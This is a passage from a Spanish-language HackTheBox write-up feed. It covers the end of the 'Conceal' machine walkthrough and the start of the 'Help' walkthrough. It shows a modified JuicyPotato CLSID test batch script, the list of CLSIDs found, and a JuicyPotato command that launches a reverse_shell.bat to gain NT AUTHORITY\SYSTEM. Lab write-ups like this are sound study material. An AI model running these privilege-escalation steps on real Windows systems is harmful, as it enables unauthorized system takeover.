class=&#34;nv&#34;&gt;$null&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;$CLSID&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/conceal/Screenshot%20from%202019-04-10%2000.29.40.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Nos imprimira un alista de &lt;code&gt;AppID&lt;/code&gt; y &lt;code&gt;CLSID&lt;/code&gt;, copiamos y guardamos los &lt;code&gt;CLSID&lt;/code&gt; en un archivo para probar cada uno de ellos con el archivo &lt;code&gt;test_clsid.bat&lt;/code&gt; de &lt;code&gt;juicypotato&lt;/code&gt;. (&lt;a href=&#34;https://github.com/ohpe/juicy-potato/blob/master/Test/test_clsid.bat&#34;&gt;https://github.com/ohpe/juicy-potato/blob/master/Test/test_clsid.bat&lt;/a&gt;)&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/conceal/Screenshot%20from%202019-04-10%2000.38.39.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Vamos a hacer un pequeño cambio en nuestro archivo &lt;code&gt;test_clsid.bat&lt;/code&gt;, solo cambiamos la ruta de nuestros archivos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;@echo off
:: Starting port, you can change it
&lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; /a &lt;span class=&#34;nv&#34;&gt;port&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;10000&lt;/span&gt;
SETLOCAL ENABLEDELAYEDEXPANSION

FOR /F %%i IN &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;estitute&lt;span class=&#34;se&#34;&gt;\V&lt;/span&gt;ideos&lt;span class=&#34;se&#34;&gt;\t&lt;/span&gt;mp.list&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; DO &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;
   &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; %%i !port!
   C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;estitute&lt;span class=&#34;se&#34;&gt;\V&lt;/span&gt;ideos&lt;span class=&#34;se&#34;&gt;\J&lt;/span&gt;uicyPotato.exe -z -l !port! -c %%i &amp;gt;&amp;gt; C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;estitute&lt;span class=&#34;se&#34;&gt;\V&lt;/span&gt;ideos&lt;span class=&#34;se&#34;&gt;\r&lt;/span&gt;esult.log
   &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;RET&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;!ERRORLEVEL!
   :: &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; !RET!
   &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;!RET!&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;1&amp;#34;&lt;/span&gt;  &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; /a &lt;span class=&#34;nv&#34;&gt;port&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;port+1
&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Descargamos los archivos necesarios en la maquina.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/conceal/Screenshot%20from%202019-04-10%2000.46.21.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Ejecutamos &lt;code&gt;test_clsid.bat&lt;/code&gt;, el cual nos creara un archivo log (&lt;code&gt;result.log&lt;/code&gt;) con las pruebas de &lt;code&gt;CLSID&lt;/code&gt; que hay en la lista que creamos anteriormente.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/conceal/Screenshot%20from%202019-04-10%2001.03.30.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;lista-clsid&#34;&gt;Lista CLSID&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;7c5-91bf-4547-81ae-fec91a89dec5&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;CONCEAL&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;estitute
&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;0fb40f0d-1021-4022-8da0-aab0588dfc8b&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;NT AUTHORITY&lt;span class=&#34;se&#34;&gt;\L&lt;/span&gt;OCAL SERVICE
&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;1BE1F766-5536-11D1-B726-00C04FB926AF&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;NT AUTHORITY&lt;span class=&#34;se&#34;&gt;\L&lt;/span&gt;OCAL SERVICE
&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;204810b9-73b2-11d4-bf42-00b0d0118b56&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;NT AUTHORITY&lt;span class=&#34;se&#34;&gt;\L&lt;/span&gt;OCAL SERVICE
&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;2e5e84e9-4049-4244-b728-2d24227157c7&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;NT AUTHORITY&lt;span class=&#34;se&#34;&gt;\L&lt;/span&gt;OCAL SERVICE
&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;30766BD2-EA1C-4F28-BF27-0B44E2F68DB7&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;NT AUTHORITY&lt;span class=&#34;se&#34;&gt;\S&lt;/span&gt;YSTEM
&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;42C21DF5-FB58-4102-90E9-96A213DC7CE8&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;NT AUTHORITY&lt;span class=&#34;se&#34;&gt;\S&lt;/span&gt;YSTEM
&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;42CBFAA7-A4A7-47BB-B422-BD10E9D02700&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;NT AUTHORITY&lt;span class=&#34;se&#34;&gt;\S&lt;/span&gt;YSTEM
&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;4661626C-9F41-40A9-B3F5-5580E80CB347&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;NT AUTHORITY&lt;span class=&#34;se&#34;&gt;\S&lt;/span&gt;YSTEM
&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;4B6C85F1-A6D9-433A-9789-89EA153626ED&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;NT AUTHORITY&lt;span class=&#34;se&#34;&gt;\S&lt;/span&gt;YSTEM
&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;6d8ff8d2-730d-11d4-bf42-00b0d0118b56&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;NT AUTHORITY&lt;span class=&#34;se&#34;&gt;\L&lt;/span&gt;OCAL SERVICE
&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;6d8ff8dc-730d-11d4-bf42-00b0d0118b56&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;NT AUTHORITY&lt;span class=&#34;se&#34;&gt;\L&lt;/span&gt;OCAL SERVICE
&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;6d8ff8dd-730d-11d4-bf42-00b0d0118b56&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;NT AUTHORITY&lt;span class=&#34;se&#34;&gt;\L&lt;/span&gt;OCAL SERVICE
&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;6d8ff8df-730d-11d4-bf42-00b0d0118b56&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;NT AUTHORITY&lt;span class=&#34;se&#34;&gt;\L&lt;/span&gt;OCAL SERVICE
&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;6d8ff8e1-730d-11d4-bf42-00b0d0118b56&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;NT AUTHORITY&lt;span class=&#34;se&#34;&gt;\L&lt;/span&gt;OCAL SERVICE
&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;6d8ff8e5-730d-11d4-bf42-00b0d0118b56&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;NT AUTHORITY&lt;span class=&#34;se&#34;&gt;\L&lt;/span&gt;OCAL SERVICE
&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;6d8ff8e7-730d-11d4-bf42-00b0d0118b56&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;NT AUTHORITY&lt;span class=&#34;se&#34;&gt;\L&lt;/span&gt;OCAL SERVICE
&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;7D096C5F-AC08-4F1F-BEB7-5C22C517CE39&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;NT AUTHORITY&lt;span class=&#34;se&#34;&gt;\S&lt;/span&gt;YSTEM
&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;8BC3F05E-D86B-11D0-A075-00C04FB68820&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;NT AUTHORITY&lt;span class=&#34;se&#34;&gt;\S&lt;/span&gt;YSTEM
&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;9678f47f-2435-475c-b24a-4606f8161c16&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;CONCEAL&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;estitute
&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;97061DF1-33AA-4B30-9A92-647546D943F3&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;NT AUTHORITY&lt;span class=&#34;se&#34;&gt;\S&lt;/span&gt;YSTEM
&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;98068995-54d2-4136-9bc9-6dbcb0a4683f&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;CONCEAL&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;estitute
&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;9acf41ed-d457-4cc1-941b-ab02c26e4686&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;CONCEAL&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;estitute
&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;9E175B68-F52A-11D8-B9A5-505054503030&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;NT AUTHORITY&lt;span class=&#34;se&#34;&gt;\S&lt;/span&gt;YSTEM
&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;9E175B6D-F52A-11D8-B9A5-505054503030&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;NT AUTHORITY&lt;span class=&#34;se&#34;&gt;\S&lt;/span&gt;YSTEM
&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;A47979D2-C419-11D9-A5B4-001185AD2B89&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;NT AUTHORITY&lt;span class=&#34;se&#34;&gt;\L&lt;/span&gt;OCAL SERVICE
&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;A9B5F443-FE02-4C19-859D-E9B5C5A1B6C6&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;NT AUTHORITY&lt;span class=&#34;se&#34;&gt;\S&lt;/span&gt;YSTEM
&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;B31118B2-1F49-48E5-B6F5-BC21CAEC56FB&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;NT AUTHORITY&lt;span class=&#34;se&#34;&gt;\S&lt;/span&gt;YSTEM
&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;B52D54BB-4818-4EB9-AA80-F9EACD371DF8&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;NT AUTHORITY&lt;span class=&#34;se&#34;&gt;\S&lt;/span&gt;YSTEM
&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;C49E32C6-BC8B-11d2-85D4-00105A1F8304&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;NT AUTHORITY&lt;span class=&#34;se&#34;&gt;\S&lt;/span&gt;YSTEM
&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;C63261E4-6052-41FF-B919-496FECF4C4E5&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;NT AUTHORITY&lt;span class=&#34;se&#34;&gt;\S&lt;/span&gt;YSTEM
&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;CBC04AF1-25C7-4A4D-BB78-28284403510F&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;NT AUTHORITY&lt;span class=&#34;se&#34;&gt;\S&lt;/span&gt;YSTEM
&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;E48EDA45-43C6-48e0-9323-A7B2067D9CD5&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;NT AUTHORITY&lt;span class=&#34;se&#34;&gt;\S&lt;/span&gt;YSTEM
&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;e60687f7-01a1-40aa-86ac-db1cbf673334&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;NT AUTHORITY&lt;span class=&#34;se&#34;&gt;\S&lt;/span&gt;YSTEM
&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;E63DE750-3BD7-4BE5-9C84-6B4281988C44&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;NT AUTHORITY&lt;span class=&#34;se&#34;&gt;\S&lt;/span&gt;YSTEM
&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;FFE1E5FE-F1F0-48C8-953E-72BA272F2744&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;NT AUTHORITY&lt;span class=&#34;se&#34;&gt;\S&lt;/span&gt;YSTEM
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Vamos a utilizar un CLSID (&lt;code&gt;{FFE1E5FE-F1F0-48C8-953E-72BA272F2744}&lt;/code&gt;) con &lt;code&gt;NT AUTHORITY\SYSTEM&lt;/code&gt; y una shell inversa (&lt;code&gt;reverse_shell.bat&lt;/code&gt;).&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;p&#34;&gt;.\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;JuicyPotato&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;exe&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-l&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;1227&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-p&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Users&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Destitute&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Videos&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;reverse_shell&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;bat&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-t&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-c&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;{FFE1E5FE-F1F0-48C8-953E-72BA272F2744};&amp;#39;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;De igual manera podemos utilizar uno de la lista que JuicyPotato tiene en su lista de Windows 10 Enterprise (&lt;a href=&#34;https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_10_Enterprise)&#34;&gt;https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_10_Enterprise)&lt;/a&gt;.&lt;/p&gt;
&lt;hr /&gt;
&lt;h2 id=&#34;root&#34;&gt;ROOT&lt;/h2&gt;
&lt;video autoplay&gt;
    &lt;source src=&#34;https://sckull.github.io/images/posts/htb/conceal/Screen record from 2019-04-10 01.38.15.mov&#34;&gt;
&lt;/video&gt;
&lt;p&gt;Obtenemos una shell &lt;code&gt;NT AUTHORITY\SYSTEM&lt;/code&gt; o root :)&lt;/p&gt;
&lt;p&gt;Y nuestra bandera &lt;code&gt;root.txt&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/conceal/Screenshot%20from%202019-04-10%2001.40.23.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/htb/conceal/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/htb/conceal/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>windows</category>
            
          
        
        
          
            
              <category>hackthebox</category>
            
          
        
        
      </item>
      
      <item>
        <title>Hack The Box - Help</title>
        <link>https://sckull.github.io/posts/help/</link>
        <pubDate>Sat, 02 Mar 2019 00:00:00 +0000</pubDate>
        
        <atom:modified>Sat, 02 Mar 2019 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/help/</guid>
        <description>Help es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.</description>
        <content:encoded>&lt;p&gt;Help es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/htb/help/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;h2 id=&#34;nmap&#34;&gt;NMAP&lt;/h2&gt;
&lt;p&gt;Escaneo de puertos con nmap.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;Nmap 7.70 scan initiated Sat Jan &lt;span class=&#34;m&#34;&gt;19&lt;/span&gt; 23:53:49 &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt; as: nmap -sV -A -sC -o nmap.tcp 10.10.10.121
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.121
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.20s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;997&lt;/span&gt; closed ports
PORT     STATE SERVICE VERSION
